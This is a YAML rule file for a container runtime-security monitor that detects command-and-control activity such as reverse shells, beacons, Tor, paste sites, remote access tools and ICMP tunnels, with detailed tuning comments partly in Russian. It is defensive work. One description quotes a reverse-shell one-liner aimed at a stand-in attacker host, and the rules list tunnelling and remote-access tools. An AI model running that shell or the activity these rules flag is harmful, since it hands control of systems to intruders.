rules:
  # MITRE ATT&CK: T1071.001 — Application Layer Protocol: Web Protocols
  - id: c2_reverse_shell_standard_ports
    name: "Reverse shell — outbound connection on standard ports from unexpected process"
    description: >
      A shell (bash, sh, zsh) opened a network connection. Legitimate shells
      should not make direct network connections — this is the canonical
      reverse shell indicator (`bash -i >& /dev/tcp/attacker/4444 0>&1`).
    event_type: network
    condition_group:
      operator: and
      conditions:
        - field: proc.comm
          op: in
          values: ["bash", "sh", "zsh", "dash", "ksh", "tcsh", "fish"]
        - field: network.dport
          op: not_in
          values: ["53", "123"]   # allow DNS and NTP from shell utilities
    severity: critical
    action: alert
    tags: [mitre:T1071.001, command-and-control, reverse-shell]

  # MITRE ATT&CK: T1095 — Non-Application Layer Protocol
  - id: c2_raw_socket_shell
    name: "Shell using raw socket"
    description: >
      A shell process opened a raw socket (SOCK_RAW). Raw sockets bypass
      the normal TCP/UDP stack and are used for covert channels, ICMP tunnels,
      and custom C2 protocols.
    event_type: syscall
    condition_group:
      operator: and
      conditions:
        - field: proc.comm
          op: in
          values: ["bash", "sh", "zsh", "python3", "python", "perl", "ruby"]
        - field: syscall.nr
          op: equals
          values: ["41"]   # socket
    severity: warning
    action: alert
    tags: [mitre:T1095, command-and-control]

  # MITRE ATT&CK: T1071.001 — Repeated outbound connection on C2 ports (beacon)
  # plan.md wave 5.7 (замер №2.3, находка №12): grafana added to the comm
  # exclusion list alongside the existing package-manager/dev-tool entries —
  # its own periodic scrape of prometheus on 9090 is a fixed-interval
  # non-standard-port connection by design, the exact shape this rule looks
  # for. Not a dport carve-out: an attacker beacon to any port, including
  # 9090, from any other process still alerts.
  - id: beacon_fixed_interval
    name: "Fixed-interval C2 beacon — repeated connection to non-standard port"
    description: >
      Repeated outbound TCP connections to a non-standard port from a non-browser
      process. Short-lived connections to the same destination at fixed intervals
      are the canonical Metasploit/Cobalt Strike beacon pattern (T1071.001).
    event_type: network
    condition_group:
      operator: and
      conditions:
        - field: network.dport
          op: not_in
          values: ["22", "53", "80", "123", "443", "3306", "5432", "6379", "5353"]
        # Волна 6.2.2 (открытый вопрос 4 к находкам №230/№231): у этого правила
        # был ровно тот же дефект, что у c2_periodic_beacon_pattern — имя и
        # описание обещают "repeated ... at fixed intervals", а условие
        # проверяло только порт и comm, то есть поднималось и на ОДНОМ
        # соединении. Волна 6.2.1 лечила это списком исключений (ниже), что
        # заглушает фон, но не отличает бикон от разового коннекта: полезная
        # нагрузка, назвавшая себя иначе, поднимала critical одним connect'ом.
        # Условие периодичности берётся из того же BeaconIntervalTracker, что
        # уже пишется на каждом TCP-connect (beacon_periodicity.go) — на
        # горячем пути это чтение уже посчитанной величины, не новая работа.
        # Исключения ОСТАЮТСЯ: k3s-server/coredns периодичны по построению и
        # условие периодичности их не снимает.
        - field: conn_periodic_count_5m
          op: gt
          values: ["2"]
        - field: conn_periodic_cv_5m
          op: lt
          values: ["0.35"]
        - field: proc.comm
          op: not_in
          # Wave 6.2.1 (№220): coredns's periodic upstream forwarding and
          # k3s-server's periodic node-agent connections (53/window and
          # 45/window respectively on the 6.2 baseline) are fixed-interval
          # non-standard-port traffic by design — same class as grafana above.
          values: ["curl", "wget", "apt", "yum", "dnf", "pip", "pip3",
                   "npm", "yarn", "gem", "cargo", "go", "gradle", "mvn",
                   "ssh", "scp", "rsync", "nmap", "nc", "netcat",
                   "grafana", "prometheus"]
    severity: warning
    action: alert
    tags: [mitre:T1071.001, command-and-control, beaconing, c2]
    exceptions:
      # Волна 6.2.1, продакшен-ужесточение (№220/№221). Фон ноды исключается
      # ТОЛЬКО в хостовом контексте: comm процесс назначает себе сам
      # (prctl(PR_SET_NAME), exec -a), а пустые container_id/pod_name приходят
      # из cgroup и означают «задача не в контейнере». Полезная нагрузка в
      # поде, назвавшая себя "k3s-server", под исключение не попадает и правило
      # её поднимает.
      - name: node-host-daemon
        condition_group:
          operator: and
          conditions:
            - field: proc.comm
              op: in
              values: ["k3s-server"]
            - field: container.id
              op: eq
              values: [""]
            - field: k8s.pod
              op: eq
              values: [""]
            # Волна 6.2.1, слой 2 (№220/№221): образ демона. Ось из cgroup выше
            # отвечает только «процесс НЕ в контейнере» и у всех хостовых процессов
            # пуста одинаково — она не отличает демона ноды от чего угодно,
            # запущенного на ней под root с тем же comm. /proc/<pid>/exe ставит ядро
            # в execve: prctl(PR_SET_NAME) и `exec -a` меняют comm и argv[0] и эту
            # ссылку не трогают. Условие СТОИТ ПОСЛЕДНИМ намеренно: группа "and"
            # вычисляется по порядку с коротким замыканием, поэтому readlink
            # случается только там, где имя демона уже совпало.
            #
            # Проверяется КАТАЛОГ образа, а не точный путь, потому что точный путь
            # k3s/containerd зависит от способа установки, а вписать сюда догадку —
            # значит рискнуть тем, что исключение молча перестанет применяться.
            # Ужесточение до точных путей — после того, как контроль 6.2.1.8
            # напечатает фактические exe_path демонов этого стенда. Уже в этой
            # редакции обход требует записи в системный каталог (root + срабатывание
            # evasion_system_binary_replace), а не `cp` в /tmp.
            #
            # Пустой exe_path (процесс умер, нет доступа к /proc) под prefix не
            # подходит — исключение не применяется, правило срабатывает: отказ
            # открытый, в сторону шума, который видно.
            - field: proc.exe_path
              op: prefix
              values: ["/usr/", "/bin/", "/sbin/", "/opt/", "/var/lib/rancher/"]
      # Волна 6.2.1, продакшен-ужесточение (№220/№221). Системный под ноды
      # исключается по СВОЕМУ namespace: его процесс себе не назначит, а имя
      # "coredns" — назначит. Под в чужом namespace исключения не получает.
      - name: kube-system-pod
        condition_group:
          operator: and
          conditions:
            - field: proc.comm
              op: in
              values: ["coredns"]
            - field: k8s.namespace
              op: eq
              values: ["kube-system"]

  # MITRE ATT&CK: T1132.001 — Data Encoding: Standard Encoding
  #
  # Wave 6.2.2 (№230/№231). Before this revision the condition below was the
  # entire rule: any single TCP connect to a non-standard port from a
  # non-collector comm — no periodicity, no repetition, no short-lived-ness,
  # despite the name and description promising all three. On the 6.2.1
  # measurement window it fired 602 times (98 exported + 504 rate-limiter
  # cut), 71% of every real rule match in the run, entirely on one-off
  # control-plane connections (6443/10250/2379/2380) that happen once and
  # never repeat — the opposite of a beacon. Because the rule is `info`
  # severity it never reached the store, so the exception list built from
  # the store (wave 6.2's narrowing, №220) could not see it either (№230):
  # narrowing and measurement were reading different axes.
  #
  # The fix is a real periodicity condition, not another exception —
  # an exception on this rule would also silence a genuine beacon that
  # happens to share a comm/port with legitimate traffic. conn_periodic_count_5m
  # and conn_periodic_cv_5m (BeaconIntervalTracker, beacon_periodicity.go)
  # require at least 3 connections to the SAME (pid, daddr, dport) within 5
  # minutes with a regular cadence (coefficient of variation < 0.35) before
  # this rule fires at all. A single connection — the k3s-server/control-plane
  # case — now has conn_periodic_count_5m < 3 and does not match.
  - id: c2_periodic_beacon_pattern
    name: "Periodic small outbound connection — C2 beacon pattern"
    description: >
      Repeated outbound TCP connections to the same destination at a
      regular cadence (low interval variance). C2 beaconing typically uses
      short keep-alive connections at a fixed or jittered-but-bounded
      interval to check for tasking without generating sustained bandwidth.
    event_type: network
    condition_group:
      operator: and
      conditions:
        - field: network.dport
          op: not_in
          values: ["22", "53", "80", "123", "443", "5353"]
        - field: proc.comm
          op: not_in
          values: ["curl", "wget", "apt", "yum", "dnf", "pip", "pip3",
                   "npm", "yarn", "gem", "cargo", "go", "gradle", "mvn",
                   "prometheus", "grafana", "node_exporter", "telegraf",
                   "filebeat", "fluentd", "vector"]
        - field: conn_periodic_count_5m
          op: gt
          values: ["2"]
        - field: conn_periodic_cv_5m
          op: lt
          values: ["0.35"]
    severity: info
    action: alert
    tags: [mitre:T1132.001, command-and-control, beaconing]

  # MITRE ATT&CK: T1090.001 — Proxy: Internal Proxy
  - id: c2_connect_to_tor_port
    name: "Connection to Tor default ports"
    description: >
      An outbound connection was made to Tor default ports (9050, 9150).
      Attackers use Tor to route C2 traffic and make attribution impossible.
    event_type: network
    condition:
      field: network.dport
      op: in
      values: ["9050", "9150", "9051", "9151"]
    severity: critical
    action: alert
    tags: [mitre:T1090.001, command-and-control, tor]

  # MITRE ATT&CK: T1571 — Non-Standard Port
  - id: c2_high_port_outbound
    name: "Outbound connection to non-standard high port"
    description: >
      A system process connected to a high-numbered port (>40000) on an
      external host. Common C2 frameworks (Cobalt Strike, Metasploit,
      Empire) default to high ports to avoid detection.
    event_type: network
    condition_group:
      operator: and
      conditions:
        - field: network.dport
          op: gt
          values: ["40000"]
        - field: proc.comm
          op: not_in
          values: ["kubectl", "docker", "containerd", "etcd", "kube-proxy",
                   "prometheus", "grafana", "alertmanager", "jaeger",
                   "envoy", "istio-proxy", "linkerd"]
    severity: warning
    action: alert
    tags: [mitre:T1571, command-and-control]

  # MITRE ATT&CK: T1102 — Web Service (C2 via pastebin, github, etc.)
  - id: c2_paste_site_access
    name: "Connection to paste / dead-drop site"
    description: >
      A process accessed a known paste or dead-drop site (pastebin, ghostbin,
      dpaste, etc.) from a server environment. Attackers use these sites to
      host second-stage payloads and C2 instructions.
    event_type: dns
    condition:
      field: dns.qname
      op: in
      values:
        - "pastebin.com"
        - "ghostbin.co"
        - "paste.ee"
        - "dpaste.org"
        - "paste.ubuntu.com"
        - "hastebin.com"
        - "termbin.com"
        - "ix.io"
        - "sprunge.us"
        - "0bin.net"
    severity: warning
    action: alert
    tags: [mitre:T1102, command-and-control, exfiltration]

  # MITRE ATT&CK: T1219 — Remote Access Software
  - id: c2_remote_access_tool
    name: "Remote access tool binary executed"
    description: >
      A known remote access tool (RAT) binary was executed. These tools
      provide full C2 capability and are never expected in production
      Kubernetes workloads.
    event_type: syscall
    condition_group:
      operator: and
      conditions:
        - field: proc.comm
          op: in
          values: ["ngrok", "frp", "frpc", "frps", "chisel", "ligolo",
                   "rathole", "bore", "cloudflared", "teleport",
                   "teamviewer", "anydesk", "vnc", "vncserver",
                   "x11vnc", "tmate", "gotty"]
        - field: syscall.nr
          op: equals
          values: ["59"]
    severity: warning
    action: alert
    tags: [mitre:T1219, command-and-control, remote-access]

  # MITRE ATT&CK: T1008 — Fallback Channels
  - id: c2_icmp_large_payload
    name: "Large ICMP packet — possible ICMP tunnel"
    description: >
      An ICMP packet larger than 200 bytes was sent or received. Normal ping
      uses 64-byte packets; ICMP tunneling tools (icmptunnel, ptunnel) encode
      data in oversized ICMP payloads to create covert C2 channels.
    event_type: network
    condition_group:
      operator: and
      conditions:
        - field: network.proto
          op: equals
          values: ["1"]     # IPPROTO_ICMP
        - field: network.dport
          op: gt
          values: ["200"]   # payload size proxy via dport field
    severity: warning
    action: alert
    tags: [mitre:T1008, command-and-control, covert-channel]
